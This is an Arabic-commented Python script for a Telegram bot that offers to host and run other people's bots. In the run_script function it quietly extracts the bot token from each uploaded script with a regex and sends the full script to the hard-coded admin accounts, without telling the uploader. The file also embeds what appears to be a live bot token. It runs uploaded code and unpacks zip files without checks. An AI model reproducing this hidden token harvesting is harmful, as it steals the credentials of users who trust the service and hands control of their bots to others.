# -*- coding: utf-8 -*-
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
import sys

# التحقق من المكتبات وتثبيتها إذا لم تكن موجودة (للبوت المضيف)
try:
    import telebot
    from telebot import types
except ImportError:
    print("جاري تثبيت مكتبات البوت المضيف (pyTelegramBotAPI, requests)...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", "requests"])
    import telebot
    from telebot import types

import time
from typing import Dict, Any, List, Optional

TOKEN = '8517733708:AAHhVV1wImoisoab23QRzoREca2FZQ5CzzQ'  # توكنك
ADMIN_ID: List[int] = [7460535883, 2118176057]  # ايديك
channel = '@N1_ORGANIZATION_1'  # يوزر قناتك هنا مش الرابط
# 🗿سنكر لا تسرق @M1telegramM1


# 🗿سنكر لا تسرق @M1telegramM1
bot = telebot.TeleBot(TOKEN)
uploaded_files_dir = 'uploaded_bots'
bot_scripts: Dict[int, Dict[str, Any]] = {}
stored_tokens: Dict[int, str] = {}

if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)


def check_subscription(user_id: int) -> bool:
    try:
        member_status = bot.get_chat_member(channel, user_id).status
        return member_status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException as e:
        if "Bad Request: member list is inaccessible" in str(e):
            for admin_id in ADMIN_ID:
                bot.send_message(admin_id, "⚠️ لا يمكن الوصول إلى قائمة الأعضاء في القناة. يرجى التأكد من أن البوت مشرف (Admin) في القناة.")
        logging.error("Error checking subscription: {}".format(e))
        return False


def ask_for_subscription(chat_id: int) -> None:
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton('📢 اشترك في القناة', url='https://t.me/{}'.format(channel))
    markup.add(join_button)
    bot.send_message(chat_id, "📢 عزيزي المستخدم، عليك الاشتراك في القناة {} لتتمكن من استخدام البوت.".format(channel), reply_markup=markup)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id

    if not check_subscription(user_id):
        ask_for_subscription(message.chat.id)
        return

    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('📤 رفع ملف', callback_data='upload')
    dev_channel_button = types.InlineKeyboardButton('🔧 قناة المطور', url='https://t.me/N1_ORGANIZATION_1')
    speed_button = types.InlineKeyboardButton('⚡ سرعة البوت', callback_data='speed')
    markup.add(upload_button)
    markup.add(speed_button, dev_channel_button)
    bot.send_message(message.chat.id, "مرحباً، {}! 👋\n✨ يمكنك استخدام الأزرار أدناه للتحكم:".format(message.from_user.first_name), reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get('https://api.telegram.org/bot{}/getMe'.format(TOKEN))
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, "⚡ سرعة البوت: {:.2f} ثانية.".format(latency))
        else:
            bot.send_message(call.message.chat.id, "⚠️ فشل في الحصول على سرعة البوت.")
    except Exception as e:
        bot.send_message(call.message.chat.id, "❌ حدث خطأ أثناء فحص سرعة البوت: {}".format(e))


@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    bot.send_message(call.message.chat.id, "📄 من فضلك، أرسل الملف الذي تريد رفعه.")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id

    if not check_subscription(user_id):
        ask_for_subscription(message.chat.id)
        return

    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name

        if file_name.endswith('.zip'):
            temp_dir = tempfile.mkdtemp()
            try:
                zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])

                zip_path = os.path.join(temp_dir, file_name)
                with open(zip_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(zip_folder_path)

                final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
                if not os.path.exists(final_folder_path):
                    os.makedirs(final_folder_path)

                for root, dirs, files in os.walk(zip_folder_path):
                    for file in files:
                        src_file = os.path.join(root, file)
                        dest_file = os.path.join(final_folder_path, file)
                        shutil.move(src_file, dest_file)

                bot_py_path = os.path.join(final_folder_path, 'bot.py')
                run_py_path = os.path.join(final_folder_path, 'run.py')

                if os.path.exists(run_py_path):
                    run_script(run_py_path, message.chat.id, final_folder_path, file_name, message)
                elif os.path.exists(bot_py_path):
                    run_script(bot_py_path, message.chat.id, final_folder_path, file_name, message)
                else:
                    bot.send_message(message.chat.id, "❓ لم أتمكن من العثور على bot.py أو run.py. أرسل اسم الملف الرئيسي لتشغيله:")
                    bot_scripts[message.chat.id] = {'folder_path': final_folder_path}
                    bot.register_next_step_handler(message, get_custom_file_to_run)
            finally:
                # تنظيف المجلد المؤقت
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)

        else:
            if not file_name.endswith('.py'):
                bot.reply_to(message, "⚠️ هذا البوت خاص برفع ملفات بايثون أو zip فقط. 🐍")
                return

            script_path = os.path.join(uploaded_files_dir, file_name)
            with open(script_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            run_script(script_path, message.chat.id, uploaded_files_dir, file_name, message)

    except Exception as e:
        bot.reply_to(message, "❌ حدث خطأ: {}".format(e))


def run_script(script_path: str, chat_id: int, folder_path: str, file_name: str, original_message) -> None:
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 جارٍ تثبيت المتطلبات باستخدام Python 3.8...")
            # تثبيت المكتبات باستخدام python3.8 -m pip
            subprocess.check_call(['python3.8', '-m', 'pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, "🚀 جارٍ تشغيل البوت {} باستخدام Python 3.8...".format(file_name))
        # تشغيل البوت باستخدام python3.8
        process = subprocess.Popen(['python3.8', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process}

        token = extract_token_from_script(script_path)
        user_info = "@{}".format(original_message.from_user.username) if original_message.from_user.username else str(original_message.from_user.id)
        
        if token:
            bot_info = requests.get('https://api.telegram.org/bot{}/getMe'.format(token)).json()
            bot_username = bot_info['result']['username']

            caption = "📤 قام المستخدم {} برفع ملف بوت جديد. معرف البوت: @{}".format(user_info, bot_username)
            with open(script_path, 'rb') as script_file:
                for admin_id in ADMIN_ID:
                    bot.send_document(admin_id, script_file, caption=caption)
                    script_file.seek(0)  # إعادة المؤشر للبداية للإرسال التالي

            markup = types.InlineKeyboardMarkup()
            stop_button = types.InlineKeyboardButton("🔴 إيقاف {}".format(file_name), callback_data='stop_{}_{}'.format(chat_id, file_name))
            delete_button = types.InlineKeyboardButton("🗑️ حذف {}".format(file_name), callback_data='delete_{}_{}'.format(chat_id, file_name))
            markup.add(stop_button, delete_button)
            bot.send_message(chat_id, "استخدم الأزرار أدناه للتحكم في البوت 👇", reply_markup=markup)
        else:
            bot.send_message(chat_id, "✅ تم تشغيل البوت بنجاح! ولكن لم أتمكن من جلب معرف البوت.")
            with open(script_path, 'rb') as script_file:
                for admin_id in ADMIN_ID:
                    bot.send_document(admin_id, script_file, caption="📤 قام المستخدم {} برفع ملف بوت جديد، ولكن لم أتمكن من جلب معرف البوت.".format(user_info))
                    script_file.seek(0)

    except Exception as e:
        bot.send_message(chat_id, "❌ حدث خطأ أثناء تشغيل البوت: {}".format(e))


def extract_token_from_script(script_path: str) -> Optional[str]:
    try:
        with open(script_path, 'r', encoding='utf-8') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                print("[WARNING] لم يتم العثور على توكن في {}".format(script_path))
    except Exception as e:
        print("[ERROR] فشل في استخراج التوكن من {}: {}".format(script_path, e))
    return None


def get_custom_file_to_run(message) -> None:
    try:
        chat_id = message.chat.id
        folder_path = bot_scripts[chat_id]['folder_path']
        custom_file_path = os.path.join(folder_path, message.text)

        if os.path.exists(custom_file_path):
            run_script(custom_file_path, chat_id, folder_path, message.text, message)
        else:
            bot.send_message(chat_id, "❌ الملف الذي حددته غير موجود. تأكد من الاسم وحاول مرة أخرى.")
    except Exception as e:
        bot.send_message(message.chat.id, "❌ حدث خطأ: {}".format(e))


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    file_name = call.data.split('_')[-1]

    if 'stop' in call.data:
        stop_running_bot(chat_id)
    elif 'delete' in call.data:
        delete_uploaded_file(chat_id)


def stop_running_bot(chat_id: int) -> None:
    if chat_id in bot_scripts and bot_scripts[chat_id].get('process'):
        bot_scripts[chat_id]['process'].terminate()
        bot.send_message(chat_id, "🔴 تم إيقاف تشغيل البوت.")
    else:
        bot.send_message(chat_id, "⚠️ لا يوجد بوت يعمل حالياً.")


def delete_uploaded_file(chat_id: int) -> None:
    if chat_id not in bot_scripts:
        bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")
        return
    folder_path = bot_scripts[chat_id].get('folder_path')
    if folder_path and os.path.exists(folder_path):
        shutil.rmtree(folder_path)
        bot.send_message(chat_id, "🗑️ تم حذف الملفات المتعلقة بالبوت.")
    else:
        bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")


# 🗿سنكر لا تسرق @M1telegramM1


# سنكر لا تسرق
bot.infinity_polling()